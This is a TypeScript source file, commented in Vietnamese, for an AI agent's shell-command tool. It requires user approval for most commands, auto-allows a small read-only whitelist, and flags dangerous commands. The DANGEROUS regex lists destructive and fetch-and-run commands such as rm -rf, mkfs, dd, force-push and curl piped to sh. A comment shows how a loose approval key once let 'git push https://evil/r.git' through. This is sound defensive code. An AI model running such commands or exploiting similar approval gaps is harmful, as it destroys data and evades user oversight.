/**
 * run_command — chạy một lệnh shell trong workspace.
 *
 * Mỗi lệnh chạy độc lập (không giữ `cd` hay biến giữa các lần). Mặc định phải được người dùng duyệt;
 * chỉ một danh sách rất hẹp các lệnh chỉ-đọc (git status, ls…) không có ký tự điều khiển shell được tự cho qua.
 */

import { resolveUserPathReal } from '../fsutil/paths';
import type { PermissionNeed, ToolContext, ToolDef, ToolHost } from '../engine/types';
import { clip } from './textUtil';
import { startBackgroundCommand } from './backgroundTools'; // (lane:bg-tasks)

/**
 * Ký tự điều khiển shell, dấu nháy (thường và Unicode) và ký tự xuống dòng/ngắt dòng Unicode. Dấu nháy bị cấm vì chúng
 * làm vô hiệu mọi phép kiểm tra theo token (`"--output=x"` không còn bắt đầu bằng `--output`).
 */
const SHELL_META = /[;&|<>`$\r\n(){}'"\\\u0085\u2018-\u201F\u2028\u2029\uFF1B\uFF06\uFF5C]/;
const DANGEROUS =
  /\b(rm\s+-[a-z]*[rf][a-z]*|rmdir\s+\/s|del\s+\/[sfq]|remove-item\b.*-recurse|rd\s+\/s|format\s+[a-z]:|mkfs|dd\s+if=|shutdown|git\s+reset\s+--hard|git\s+clean\s+-[a-z]*f|git\s+push\b.*(--force|-f\b)|curl\b[^|]*\|\s*(sh|bash|pwsh|powershell)|iwr\b[^|]*\|\s*iex|chmod\s+-R|chown\s+-R)\b/i;

/**
 * DANH SÁCH CHO PHÉP DƯƠNG: cả dòng lệnh phải khớp ĐÚNG một mẫu dưới đây. Không có đối số đường dẫn, không có
 * tham số nhận giá trị tuỳ ý — nên không thể ghi tệp (`--output`), đọc tệp bất kỳ (`--no-index`, `date -f`) hay chạm
 * đường dẫn UNC (`dir \\host\share`). Mọi thứ khác đều phải xin phép như bình thường.
 */
const SAFE_COMMANDS: RegExp[] = [
  /^(pwd|whoami|hostname|get-location)$/i,
  /^(ls|dir)(\s+-[a-z]{1,8})?$/i,
  /^dir(\s+\/[a-z])?$/i,
  /^git\s+status(\s+(-s|-b|-sb|--short|--branch|--porcelain|--porcelain=v[12]))*$/,
  /^git\s+diff(\s+(--stat|--cached|--staged|--name-only|--name-status|--shortstat|--numstat|--no-color|-w|--ignore-all-space))*$/,
  /^git\s+log(\s+(--oneline|--graph|--decorate|--stat|--name-only|--no-color|--abbrev-commit|-n\s?\d{1,3}|-\d{1,3}|--max-count=\d{1,3}))*$/,
  /^git\s+show(\s+(--stat|--name-only|--no-color|--oneline|-s|--no-patch))*(\s+HEAD)?$/,
  /^git\s+branch(\s+(--show-current|--list|-a|-r|-v|-vv|--all))*$/,
  /^git\s+rev-parse(\s+(--abbrev-ref|--short|--show-toplevel|--is-inside-work-tree|--git-dir))*(\s+HEAD)?$/,
  /^git\s+remote(\s+(-v|--verbose))?$/,
  /^git\s+ls-files$/,
  /^(node|npm|npx|pnpm|yarn|python3?|py|pip3?|dotnet|java|go|cargo|rustc|git|docker|php|ruby|deno|bun)\s+(-v|--version|version)$/i,
];

/** Lệnh chỉ đọc theo danh sách cho phép dương → được chạy không cần hỏi. */
export function isReadOnlyCommand(command: string): boolean {
  const c = command.trim();
  if (!c || SHELL_META.test(c)) return false;
  return SAFE_COMMANDS.some((re) => re.test(c));
}

/**
 * Khoá cho "luôn cho phép trong phiên này": ĐÚNG nguyên văn lệnh (đã gộp khoảng trắng) và thư mục chạy.
 * Trước đây dùng hai token đầu (`python -m`, `npx -y`, `git push`…) nên một lần bấm cho phép mở cửa cho mọi đối số
 * (`python -m evil`, `git push https://evil/r.git`). Lệnh có ký tự điều khiển shell thì không bao giờ có khoá.
 */
export function commandApprovalKey(command: string, cwd: string): string | undefined {
  const c = command.replace(/\s+/g, ' ').trim();
  if (!c || SHELL_META.test(c) || c.length > 400) return undefined;
  return `cmd:${cwd}::${c}`;
}

interface RunInput {
  command: string;
  cwd?: string;
  timeout_seconds?: number;
  description?: string;
  /** (lane:bg-tasks) Chạy nền, trả về id ngay. */
  background?: boolean;
}

export function createTerminalTool(host: ToolHost): ToolDef<RunInput> {
  const winShell = host.platform.shell;
  const shellNote =
    host.platform.os !== 'windows'
      ? `The shell is ${host.platform.shellLabel} on ${host.platform.os === 'mac' ? 'macOS' : 'Linux'}. `
      : winShell === 'cmd'
        ? 'The shell is cmd.exe on Windows: use cmd syntax (dir, type, findstr, %VAR%, "&&"). Its built-in commands may print Vietnamese letters as "?" even though files are fine — use external tools (node, git, python) when exact text matters. '
        : winShell === 'bash' || winShell === 'zsh' || winShell === 'sh'
          ? `The shell is ${host.platform.shellLabel} on Windows: use POSIX syntax and quote Windows paths. `
          : `The shell is ${host.platform.shellLabel} on Windows: use PowerShell syntax (Get-ChildItem, Select-String, $env:NAME); ` +
            (winShell === 'powershell' ? 'chain commands with ";" (no "&&" in Windows PowerShell 5.1). ' : '"&&" works in PowerShell 7. ');

  return {
    name: 'run_command',
    description:
      'Run a shell command in the workspace and return its output and exit code. ' +
      shellNote +
      'Each call is independent (no persistent cd/variables): use the cwd parameter. Do not run interactive commands. ' +
      'Output is truncated if huge. Use it for tests, builds, git, package managers, scripts — prefer the dedicated file tools for reading/editing files.' +
      // (lane:bg-tasks)
      (host.startProcess
        ? ' For commands that never end or run very long (dev servers like "npm run dev", watchers, long builds/test suites) set background:true: it returns a task id (bg1…) at once with the first output; ' +
          'then use command_output to read new output, command_stop to stop it, command_list to see tasks. You are told automatically when a background task ends. Never start a dev server without background:true.'
        : ' Do not run never-ending servers.'),
    inputSchema: {
      type: 'object',
      properties: {
        command: { type: 'string', description: 'The command line to run.' },
        cwd: { type: 'string', description: 'Working directory (default: workspace root).' },
        timeout_seconds: { type: 'integer', minimum: 1, maximum: 1800, description: 'Kill the command after this many seconds.' },
        description: { type: 'string', description: 'One short sentence (user\'s language) saying what the command does.' },
        // (lane:bg-tasks)
        ...(host.startProcess
          ? { background: { type: 'boolean', description: 'Run in the background and return a task id immediately (dev servers, watchers, very long jobs).' } }
          : {}),
      },
      required: ['command'],
    },
    risk: 'exec',
    concurrencySafe: false,
    streamsContent: false,
    async permission(input, ctx: ToolContext): Promise<PermissionNeed | null> {
      const cwd = await resolveUserPathReal(ctx.host, input.cwd ?? '.');
      const outside = cwd.zone === 'outside';
      if (!outside && isReadOnlyCommand(input.command)) return null;
      const dangerous = DANGEROUS.test(input.command);
      const key = dangerous || outside ? undefined : commandApprovalKey(input.command, cwd.rel);
      return {
        kind: 'command',
        title: input.description?.trim() ? clip(input.description.trim(), 120) : 'Chạy lệnh này?',
        detail: [outside ? `Thư mục chạy nằm ngoài workspace: ${cwd.abs}` : '', dangerous ? 'Lệnh này có thể xoá dữ liệu hoặc khó hoàn tác — kiểm tra kỹ trước khi cho phép.' : '', input.background ? 'Chạy nền: lệnh tiếp tục chạy sau lượt này, dừng được ở mục «tác vụ nền» phía trên ô nhập.' : ''] // (lane:bg-tasks)
          .filter(Boolean)
          .join('\n') || undefined,
        command: input.command,
        sessionKey: key,
        sessionLabel: key ? `Luôn cho phép đúng lệnh \`${clip(input.command.replace(/\s+/g, ' ').trim(), 60)}\` trong phiên này` : undefined,
        elevated: outside || dangerous,
      };
    },
    async execute(input, ctx) {
      const cwd = await resolveUserPathReal(ctx.host, input.cwd ?? '.');
      const st = await ctx.host.stat(cwd.abs);
      if (!st?.isDirectory) return { content: `Thư mục chạy không tồn tại: ${input.cwd ?? '(workspace)'}`, isError: true };
      if (input.background && ctx.host.startProcess) return startBackgroundCommand(input, { abs: cwd.abs, rel: cwd.rel }, ctx); // (lane:bg-tasks)

      const configured = ctx.host.setting<number>('terminal.timeoutSeconds', 120);
      const seconds = Math.min(1800, Math.max(1, input.timeout_seconds ?? configured));

      // Gom đầu ra thành từng cụm nhỏ trước khi đẩy lên giao diện để không làm nghẽn kênh.
      let pending = '';
      let timer: ReturnType<typeof setTimeout> | null = null;
      const flush = () => {
        timer = null;
        if (pending) {
          ctx.progress(pending);
          pending = '';
        }
      };

      const res = await ctx.host.runCommand({
        command: input.command,
        cwd: cwd.abs,
        timeoutMs: seconds * 1000,
        signal: ctx.signal,
        onData: (chunk) => {
          pending += chunk;
          if (pending.length > 4000) pending = pending.slice(pending.length - 4000);
          if (!timer) timer = setTimeout(flush, 150);
        },
      });
      if (timer) clearTimeout(timer);
      flush();

      const output = res.output.replace(/\u001b\[[0-9;]*[A-Za-z]/g, '').trimEnd();
      if (res.aborted) return { content: `Lệnh bị dừng theo yêu cầu.\n${output}`.trimEnd(), isError: true, summary: 'đã dừng' };
      if (res.timedOut) {
        const content = `Lệnh bị dừng sau ${seconds} giây (hết thời gian).\n${output}`.trimEnd();
        // Không có byte đầu ra nào: chưa phân biệt được «shell chưa kịp chạy lệnh» (Windows PowerShell thỉnh thoảng khởi động rất chậm — 9/10 lần hết giờ
        // trong nhật ký Locaith-v5-flash không có đầu ra) với «lệnh im lặng cho tới lúc xong». Nói «có thể», không khẳng định nguyên nhân.
        const hint = output.trim()
          ? ''
          : '\nGợi ý: chưa nhận được đầu ra nào — có thể shell khởi động chậm, hoặc lệnh không in gì cho tới khi xong. Hãy thử lại MỘT lần với timeout_seconds lớn hơn (≥ 120) trước khi kết luận lệnh bị treo; nếu vẫn lặp lại thì báo người dùng (cài đặt locaithAgent.terminal.shell cho phép đổi shell).';
        // (lane:bg-tasks) lệnh chạy lâu/không bao giờ dừng → chỉ đường sang chạy nền.
        const bgHint = ctx.host.startProcess
          ? '\nNếu đây là lệnh chạy rất lâu hoặc không tự dừng (server dev, watcher, bộ test dài): hãy chạy lại với background:true rồi đọc tiến độ bằng command_output.'
          : '';
        return { content: `${content}${hint}${bgHint}`, isError: true, summary: 'hết giờ' };
      }
      const ok = res.exitCode === 0;
      const header = `Mã thoát: ${res.exitCode ?? 'không rõ'}`;
      const body = output ? `\n${output}` : '\n(không có đầu ra)';
      const trunc = res.truncated ? '\n[Đầu ra quá dài, đã cắt bớt.]' : '';
      return { content: header + body + trunc, isError: !ok, summary: ok ? 'thành công' : `mã ${res.exitCode ?? '?'}`, display: output.slice(-3000) };
    },
  };
}
